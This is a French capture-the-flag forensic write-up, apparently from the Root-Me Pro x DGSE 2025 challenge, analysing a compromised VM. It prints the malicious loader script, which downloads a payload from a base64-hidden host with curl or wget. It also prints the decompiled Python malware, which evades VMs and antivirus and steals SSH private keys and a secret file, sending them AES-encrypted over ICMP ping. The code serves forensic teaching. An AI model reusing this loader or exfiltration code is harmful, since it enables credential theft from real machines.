<!DOCTYPE html>
<html lang="fr-fr" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Mission 3 : Forensic# Brief de mission# La nouvelle vient d’être annoncée : l’entreprise Quantumcore a été compromise, vraisemblablement à cause d’un exécutable téléchargé sur un appareil issu du shadow IT, dont l’entreprise ignorait l’existence.
Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu’un fichier de capture réseau (PCAP) juste avant que l’attaquant ne couvre complètement ses traces. À vous d’analyser ces éléments et comprendre ce qu’il s’est réellement passé.
">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/ctf/rootmepro2025/collapsed/mission3/">
  <meta property="og:site_name" content="Blog de @camillegr">
  <meta property="og:title" content="Mission 3 - Forensic">
  <meta property="og:description" content="Mission 3 : Forensic# Brief de mission# La nouvelle vient d’être annoncée : l’entreprise Quantumcore a été compromise, vraisemblablement à cause d’un exécutable téléchargé sur un appareil issu du shadow IT, dont l’entreprise ignorait l’existence.
Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu’un fichier de capture réseau (PCAP) juste avant que l’attaquant ne couvre complètement ses traces. À vous d’analyser ces éléments et comprendre ce qu’il s’est réellement passé.">
  <meta property="og:locale" content="fr_fr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">


  <meta itemprop="name" content="Mission 3 - Forensic">
  <meta itemprop="description" content="Mission 3 : Forensic# Brief de mission# La nouvelle vient d’être annoncée : l’entreprise Quantumcore a été compromise, vraisemblablement à cause d’un exécutable téléchargé sur un appareil issu du shadow IT, dont l’entreprise ignorait l’existence.
Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu’un fichier de capture réseau (PCAP) juste avant que l’attaquant ne couvre complètement ses traces. À vous d’analyser ces éléments et comprendre ce qu’il s’est réellement passé.">
  <meta itemprop="wordCount" content="723">

<title>Mission 3 - Forensic | Blog de @camillegr</title>
<link rel="icon" href="/favicon.png" >
<link rel="manifest" href="/manifest.json">
<link rel="canonical" href="http://localhost:1313/docs/ctf/rootmepro2025/collapsed/mission3/">
<link rel="stylesheet" href="/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">


  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.d93274015fd756ee1b2ddb7a2a99505608309d9d79c0e9cad39a3da054fb0ad4.js" integrity="sha256-2TJ0AV/XVu4bLdt6KplQVggwnZ15wOnK05o9oFT7CtQ=" crossorigin="anonymous"></script>



  
</head>
<body dir="ltr" class="book-kind-page book-type-docs">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    
<aside class="book-menu">
  <div class="book-menu-content">
    
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Blog de @camillegr</span>
  </a>
</h2>


<div class="book-search hidden">
  <input id="book-search-input" type="text" 
    placeholder="Search"
    aria-label="Search"
    maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>













  
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-a1af4a996fb1fd454470e4444972e4f9" class="toggle" checked />
    <label for="section-a1af4a996fb1fd454470e4444972e4f9" class="flex">
      <a href="/docs/ctf/" class="">
        CTF</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-f3561ec6727758028b3a2ef314dd5169" class="toggle" checked />
    <label for="section-f3561ec6727758028b3a2ef314dd5169" class="flex">
      <a href="/docs/ctf/rootmepro2025/" class="">
        CTF 2025 | Root-Me Pro x DGSE</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission1/" class="">
      Mission 1 - IA</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission2/" class="">
      Mission 2 - SOC</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission3/" class="active">
      Mission 3 - Forensic</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission4/" class="">
      Mission 4 - Pentest</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission5/" class="">
      Mission 5 - Mobile</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission6/" class="">
      Mission 6 - OSINT</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="toggle"  />
    <label for="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="flex">
      <a role="button" class="">
        Projets Personnels</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/projets/collapsed/tofuzz/" class="">
      ToFuzz</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-c65aa4e708b6bdd64019a9cd49da31df" class="toggle"  />
    <label for="section-c65aa4e708b6bdd64019a9cd49da31df" class="flex">
      <a href="/docs/tryhackme/" class="">
        TryHackMe</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/hammer/" class="">
      Hammer</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/mrrobot/" class="">
      Mr Robot</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/rootme/" class="">
      RootMe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/tokyog/" class="">
      Tokyo Ghoul</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/wonderlands/" class="">
      Wonderlands</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <a>
      Divers</a>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/divers/blogs/" class="">
      Blogs</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>













</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>



  </div>
</aside>
 

    <div class="book-page">
      <header class="book-header hidden">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <h3>Mission 3 - Forensic</h3>

  <label for="toc-control">
    
    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#mission-3--forensic">Mission 3 : Forensic</a>
      <ul>
        <li><a href="#brief-de-mission">Brief de mission</a></li>
        <li><a href="#premiere-recherches">Premiere recherches</a></li>
        <li><a href="#analyse-de-install_npdatesh">Analyse de install_npdate.sh</a></li>
        <li><a href="#decompilation">Decompilation</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="mission-3--forensic">Mission 3 : Forensic<a class="anchor" href="#mission-3--forensic">#</a></h1>
<h2 id="brief-de-mission">Brief de mission<a class="anchor" href="#brief-de-mission">#</a></h2>
<p>La nouvelle vient d&rsquo;être annoncée : l&rsquo;entreprise Quantumcore a été compromise, vraisemblablement à cause d&rsquo;un exécutable téléchargé sur un appareil issu du shadow IT, dont l&rsquo;entreprise ignorait l&rsquo;existence.</p>
<p>Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu&rsquo;un fichier de capture réseau (PCAP) juste avant que l&rsquo;attaquant ne couvre complètement ses traces. À vous d&rsquo;analyser ces éléments et comprendre ce qu&rsquo;il s&rsquo;est réellement passé.</p>
<p>L&rsquo;entreprise vous met à disposition :</p>
<ul>
<li>L&rsquo;image de la VM compromise</li>
<li>Le fichier PCAP contenant une portion du trafic réseau suspect</li>
</ul>
<h2 id="premiere-recherches">Premiere recherches<a class="anchor" href="#premiere-recherches">#</a></h2>
<p>En regardant les logs et en arrivant sur la machine, on s&rsquo;aperçoit que :</p>
<ul>
<li>L&rsquo;attaque a eu lieu entre 14:02 et 14:12</li>
<li>l&rsquo;utilisateur fournit a les droits root sur la machine</li>
<li>il y a eu plusieurs telechargement de fichiers, notamment un fichier install_npdate.sh qui contient du code malveillant.</li>
</ul>
<h2 id="analyse-de-install_npdatesh">Analyse de install_npdate.sh<a class="anchor" href="#analyse-de-install_npdatesh">#</a></h2>
<p>On observe le code suivant :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> _ in <span style="color:#ff6ac1">$(</span>seq <span style="color:#ff9f43">1</span> <span style="color:#ff5c57">$__CNT</span><span style="color:#ff6ac1">)</span>; <span style="color:#ff6ac1">do</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">__R</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;/opt/</span><span style="color:#ff6ac1">$(</span>tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 8<span style="color:#ff6ac1">)</span><span style="color:#5af78e">&#34;</span>
</span></span><span style="display:flex;"><span>    mkdir -p <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__R</span><span style="color:#5af78e">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">__TMPF</span><span style="color:#ff6ac1">+=(</span><span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__R</span><span style="color:#5af78e">&#34;</span><span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">__DST</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">${</span><span style="color:#ff5c57">__TMPF</span>[<span style="color:#ff5c57">$RANDOM</span> % <span style="color:#5af78e">${#</span><span style="color:#ff5c57">__TMPF</span>[@]<span style="color:#5af78e">}</span>]<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">__DL</span><span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">$(</span><span style="color:#ff5c57">echo</span> <span style="color:#5af78e">&#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvbnRwZGF0ZV91dGlsLmNweXRob24tMzcucHlj&#34;</span> | base64 -d<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">__DLL</span><span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">$(</span><span style="color:#ff5c57">echo</span> <span style="color:#5af78e">&#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvcmVhZG1lLm1k&#34;</span> | base64 -d<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">command</span> -v curl &gt;/dev/null 2&gt;&amp;1; <span style="color:#ff6ac1">then</span>
</span></span><span style="display:flex;"><span>    curl -fsSL <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DL</span><span style="color:#5af78e">&#34;</span> -o <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DST</span><span style="color:#5af78e">/.sys&#34;</span>
</span></span><span style="display:flex;"><span>    curl -fsSL <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DLL</span><span style="color:#5af78e">&#34;</span> -o <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DST</span><span style="color:#5af78e">/.rdme&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">elif</span> <span style="color:#ff5c57">command</span> -v wget &gt;/dev/null 2&gt;&amp;1; <span style="color:#ff6ac1">then</span>
</span></span><span style="display:flex;"><span>    wget -q <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DL</span><span style="color:#5af78e">&#34;</span> -O <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DST</span><span style="color:#5af78e">/.sys&#34;</span>
</span></span><span style="display:flex;"><span>    wget -q <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DLL</span><span style="color:#5af78e">&#34;</span> -O <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DST</span><span style="color:#5af78e">/.rdme&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">echo</span> <span style="color:#5af78e">&#34;[ntpdate] Error: Neither curl nor wget found.&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">exit</span> <span style="color:#ff9f43">127</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod +x <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$__DST</span><span style="color:#5af78e">/.sys&#34;</span></span></span></code></pre></div><p>Ce morceau de code installe un executable python dans ‘/opt/????/.sys‘ nous cherchons donc cet executable et passons à la décompilation.</p>
<h2 id="decompilation">Decompilation<a class="anchor" href="#decompilation">#</a></h2>
<p>Le fichier .pyc compilé, une fois décompilé, donne le résultat suivant :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#78787e"># uncompyle6 version 3.9.2</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e"># Python bytecode version base 3.7.0 (3394)</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e"># Decompiled from: Python 3.7.3 (default, Mar 21 2025, 13:10:44) </span>
</span></span><span style="display:flex;"><span><span style="color:#78787e"># [GCC 12.2.0]</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e"># Embedded file name: nightshade.py</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e"># Compiled at: 2025-03-24 11:04:51</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e"># Size of source mod 2**32: 2358 bytes</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os<span style="color:#ff6ac1">,</span> subprocess<span style="color:#ff6ac1">,</span> psutil<span style="color:#ff6ac1">,</span> base64
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> Crypto.Cipher <span style="color:#ff6ac1">import</span> AES
</span></span><span style="display:flex;"><span>__k <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(<span style="color:#5af78e">&#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a&#34;</span>)
</span></span><span style="display:flex;"><span>__v <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(<span style="color:#5af78e">&#34;1f2d3c4b5a69788766554433221100ff&#34;</span>)
</span></span><span style="display:flex;"><span>__d <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;37e0f8f92c71f1c3f047f43c13725ef1&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__b64d</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> base64<span style="color:#ff6ac1">.</span>b64decode(s<span style="color:#ff6ac1">.</span>encode())<span style="color:#ff6ac1">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__p</span>(x):
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> x <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">bytes</span>([<span style="color:#ff9f43">16</span> <span style="color:#ff6ac1">-</span> <span style="color:#ff5c57">len</span>(x) <span style="color:#ff6ac1">%</span> <span style="color:#ff9f43">16</span>]) <span style="color:#ff6ac1">*</span> (<span style="color:#ff9f43">16</span> <span style="color:#ff6ac1">-</span> <span style="color:#ff5c57">len</span>(x) <span style="color:#ff6ac1">%</span> <span style="color:#ff9f43">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__u</span>(x):
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> x[<span style="color:#ff6ac1">None</span>[:<span style="color:#ff6ac1">-</span>x[<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>]]]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__x</span>(h):
</span></span><span style="display:flex;"><span>    c <span style="color:#ff6ac1">=</span> AES<span style="color:#ff6ac1">.</span>new(__k, AES<span style="color:#ff6ac1">.</span>MODE_CBC, __v)
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> __u(c<span style="color:#ff6ac1">.</span>decrypt(<span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(h)))<span style="color:#ff6ac1">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__y</span>(s):
</span></span><span style="display:flex;"><span>    c <span style="color:#ff6ac1">=</span> AES<span style="color:#ff6ac1">.</span>new(__k, AES<span style="color:#ff6ac1">.</span>MODE_CBC, __v)
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> c<span style="color:#ff6ac1">.</span>encrypt(__p(s<span style="color:#ff6ac1">.</span>encode()))<span style="color:#ff6ac1">.</span>hex()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__chk_vm</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">try</span>:
</span></span><span style="display:flex;"><span>        z <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">open</span>(<span style="color:#5af78e">&#34;/sys/class/dmi/id/product_name&#34;</span>)<span style="color:#ff6ac1">.</span>read()<span style="color:#ff6ac1">.</span>strip()<span style="color:#ff6ac1">.</span>lower()
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> q <span style="color:#ff6ac1">in</span> (<span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;VmlydHVhbEJveA==&#39;</span>, <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;S1ZN&#39;</span>, <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;UVFNVQ==&#39;</span>, <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;Qm9jaHM=&#39;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> base64<span style="color:#ff6ac1">.</span>b64decode(q)<span style="color:#ff6ac1">.</span>decode()<span style="color:#ff6ac1">.</span>lower() <span style="color:#ff6ac1">in</span> z:
</span></span><span style="display:flex;"><span>                <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;ERR VM&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__chk_av</span>():
</span></span><span style="display:flex;"><span>    targets <span style="color:#ff6ac1">=</span> [
</span></span><span style="display:flex;"><span>     <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;Y2xhbWQ=&#39;</span>, <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;YXZnZA==&#39;</span>, <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;c29waG9z&#39;</span>, <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;RVNFVA==&#39;</span>, <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;cmtodW50ZXI=&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> p <span style="color:#ff6ac1">in</span> psutil<span style="color:#ff6ac1">.</span>process_iter(attrs<span style="color:#ff6ac1">=</span>[<span style="color:#5af78e">&#34;name&#34;</span>]):
</span></span><span style="display:flex;"><span>            n <span style="color:#ff6ac1">=</span> (p<span style="color:#ff6ac1">.</span>info[<span style="color:#5af78e">&#34;name&#34;</span>] <span style="color:#ff6ac1">or</span> <span style="color:#5af78e">&#34;&#34;</span>)<span style="color:#ff6ac1">.</span>lower()
</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">for</span> b64av <span style="color:#ff6ac1">in</span> targets:
</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">if</span> base64<span style="color:#ff6ac1">.</span>b64decode(b64av)<span style="color:#ff6ac1">.</span>decode()<span style="color:#ff6ac1">.</span>lower() <span style="color:#ff6ac1">in</span> n:
</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;ERR AV&#34;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__exf</span>(path, dst, size<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">15</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(path):
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">False</span>
</span></span><span style="display:flex;"><span>    d <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">open</span>(path, <span style="color:#5af78e">&#34;rb&#34;</span>)<span style="color:#ff6ac1">.</span>read()
</span></span><span style="display:flex;"><span>    segs <span style="color:#ff6ac1">=</span> [d [i[:i <span style="color:#ff6ac1">+</span> size]] <span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">0</span>, <span style="color:#ff5c57">len</span>(d), size)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> seg <span style="color:#ff6ac1">in</span> segs:
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span>:
</span></span><span style="display:flex;"><span>            payload <span style="color:#ff6ac1">=</span> AES<span style="color:#ff6ac1">.</span>new(__k, AES<span style="color:#ff6ac1">.</span>MODE_CBC, __v)<span style="color:#ff6ac1">.</span>encrypt(__p(seg))<span style="color:#ff6ac1">.</span>hex()
</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># ping -c 1 -p payload </span>
</span></span><span style="display:flex;"><span>            cmd <span style="color:#ff6ac1">=</span> [__b64d(<span style="color:#5af78e">&#34;cGluZw==&#34;</span>), __b64d(<span style="color:#5af78e">&#34;LWM=&#34;</span>), __b64d(<span style="color:#5af78e">&#34;MQ==&#34;</span>), __b64d(<span style="color:#5af78e">&#34;LXA=&#34;</span>), payload, dst]
</span></span><span style="display:flex;"><span>            subprocess<span style="color:#ff6ac1">.</span>run(cmd, stdout<span style="color:#ff6ac1">=</span>(subprocess<span style="color:#ff6ac1">.</span>DEVNULL), stderr<span style="color:#ff6ac1">=</span>(subprocess<span style="color:#ff6ac1">.</span>DEVNULL))
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> __chk_vm():
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> __chk_av():
</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">else</span>:
</span></span><span style="display:flex;"><span>        __kll <span style="color:#ff6ac1">=</span> [
</span></span><span style="display:flex;"><span>         <span style="color:#5af78e">&#34;/root/.secret&#34;</span>,
</span></span><span style="display:flex;"><span>         os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>expanduser(<span style="color:#5af78e">&#34;~/.ssh/id_rsa&#34;</span>),
</span></span><span style="display:flex;"><span>         <span style="color:#5af78e">&#34;/root/.ssh/id_rsa&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> f <span style="color:#ff6ac1">in</span> __kll:
</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(f):
</span></span><span style="display:flex;"><span>                __exf(f, __x(__d))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        _kkoo <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;/root/.secret&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(_kkoo):
</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;clean&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#78787e">#                os.remove(_kkoo)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">except</span> Exception <span style="color:#ff6ac1">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">try</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">pass</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">finally</span>:
</span></span><span style="display:flex;"><span>                    e <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">None</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">del</span> e
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">__name__</span> <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    __main()</span></span></code></pre></div><p>On observe que cet executable exfiltre des données vers une autre machine. Le fichier <code>/root/.secret</code>, qui doit contenir notre drapeau, est envoyé par ICMP. On observe également que le contenu est chiffré mais l&rsquo;IV et la clé sont disponibles.</p>
